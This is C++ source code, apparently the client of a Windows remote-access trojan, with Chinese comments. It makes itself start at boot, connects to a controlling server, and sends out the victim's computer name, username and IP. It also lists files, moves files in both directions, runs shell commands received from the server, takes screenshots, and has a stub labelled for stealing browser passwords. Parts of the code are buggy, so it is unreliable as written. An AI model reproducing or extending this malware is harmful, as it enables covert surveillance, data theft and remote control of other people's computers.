#include "../tcpSocket/tcpSocke.h"

int GetPCMessage(SOCKET fd);//获取计算机基本信息

int FileBrowse(SOCKET fd);//文件浏览

int FileUplode(SOCKET fd);//文件上传

int FileDownload(SOCKET fd);//文件下载

int Shell(SOCKET fd);//执行shell指令

void SendScreenShot(SOCKET fd);//获取屏幕截图并且发送

int GetPassword(SOCKET fd);//获取浏览器密码

int main()
{
	//设置程序开机自启
	char pathName[MAX_PATH];//文件名字最大260个字符  MAX_PATH  260

	ComputerStart(pathName);

	init_Socket();//创建客户端socket

	SOCKET fd = CreatClientScoket("127.0.0.1");//连接

	char str[] = "connect success";//连接成功
	encode(str);
	send(fd, str, strlen(str), 0);

	HeartBeat(fd);//心跳功能

	char command;//存储接收的指令

	thread th1 = thread(GetPCMessage, fd);
	thread th2 = thread(FileBrowse, fd);
	thread th3 = thread(Shell, fd);
	thread th4 = thread(FileUplode, fd);
	thread th5 = thread(FileDownload, fd);
	thread th6 = thread(SendScreenShot, fd);
	thread th7 = thread(GetPassword, fd);
	while (true)
	{
		recv(fd, &command, 1, 0);
		switch (command)
		{
		case 1:
			th1.join();
			break;
		case 2:
			th2.join();
			break;
		case 3:
			th3.join();
			break;
		case 4:
			th4.join();
			break;
		case 5:
			th5.join();
			break;
		case 6:
			th6.join();
			break;
		case 7:
			th7.join();
			break;
		default:
			send(fd, "Error code", strlen("Error code"), 0);
			break;
		}
	}
	closesocket(fd);//关闭客户端socket

	close_Socket();//WSACleanup
}

int GetPCMessage(SOCKET fd)
{
	PC_Message msg;//定义msg结构体
	char UserName[BUFSIZ * 2];//定义和初始化
	char block;//接受发送来的字符

	if (getmessage(&msg) == false)//获取目标计算机的IP，计算机名以及用户名
	{
		err("getmessage");
	}

	TcharToChar(msg.UserName, UserName);//将TCHAR转换为char

	encode(msg.PCName);//加密
	cout << msg.PCName << endl;

	encode(UserName);
	cout << msg.UserName << endl;

	encode(msg.IP);
	cout << msg.IP << endl;

	if (send(fd, msg.PCName, strlen(msg.PCName), 0) == INVALID_SOCKET)//发送相应的计算机信息
	{
		err("send");
	}
	recv(fd, &block, 1, 0);			//接受一个字符防止粘包
	if (send(fd, UserName, strlen(UserName), 0) == INVALID_SOCKET)
	{
		err("send");
	}
	recv(fd, &block, 1, 0);
	if (send(fd, msg.IP, strlen(msg.IP), 0) == INVALID_SOCKET)
	{
		err("send");
	}
	recv(fd, &block, 1, 0);

	return 0;
}

int FileBrowse(SOCKET fd)
{
	//获取C盘和D盘内的所有文件名
	char FileName[FileNameRow][FileNameCol];
	char Zero[FileNameCol] = { 0 };
	GetFileName(FileName);
	for (int i = 0; i < FileNameRow; i++)
	{
		if (strcmp(FileName[i], Zero))
		{
			//printf("%s\n", FileName[i]);
			send(fd, FileName[i], strlen(FileName[i]), 0);
		}
	}
	return 0;
}

int FileDownload(SOCKET fd)
{
	char FileName[BUFSIZ] = { 0 };
	recv(fd, FileName, BUFSIZ, 0);//接收要下载的文件名（绝对路径）
	char File[BUFSIZ * 2] = { 0 };
	FILE* fp = fopen(FileName, "r");
	if (fp == NULL)
	{
		send(fd, "false", strlen("false"), 0);
	}
	else
	{
		while (!feof(fp))//读文件，直到末尾
		{
			fread(File, sizeof(unsigned __int8), 1, fp);//向File中写入
			send(fd, File, strlen(File), 0);//发送
			memset(File, 0, BUFSIZ * 2);//重置数组
		}
	}
	return 0;
}

int FileUplode(SOCKET fd)
{
	char FileName[BUFSIZ] = { 0 };//接受文件名和路径的缓冲区
	//提示由服务端提供
	recv(fd, FileName, BUFSIZ, 0);//接受要上传文件的绝对路径

	FILE* fp = fopen(FileName, "wb");  //以二进制方式打开（创建）文件
	if (fp == NULL)
	{
		send(fd, "false", strlen("false"), 0);
	}
	else
	{
		char buffer[BUFSIZ * 2] = { 0 };  //文件缓冲区
		int nCount;
		while ((nCount = recv(fd, buffer, BUFSIZ * 2, 0)) > 0)
		{
			fwrite(buffer, nCount, 1, fp);//向文件中写入数据
		}
		send(fd, "success!", strlen("success!"), 0);
	}
	fclose(fp);//传输完成后关闭文件
	return 0;
}

int Shell(SOCKET fd)
{
	char shell[BUFSIZ * 4] = { 0 };
	char res[BUFSIZ * 4] = { 0 };

	recv(fd, shell, strlen(shell), 0);	//接收发送来的shell指令
	Execmd(shell, res);					//执行shell指令
	send(fd, res, strlen(res), 0);		//发送执行后的结果
	return 0;
}

void SendScreenShot(SOCKET fd)
{
	//保存桌面截图至str指向的位置
	const char* str = "D:";
	ScreenShot((LPCTSTR)(CString)str);
	readSrc();
}

int GetPassword(SOCKET fd)
{
	return 0;
}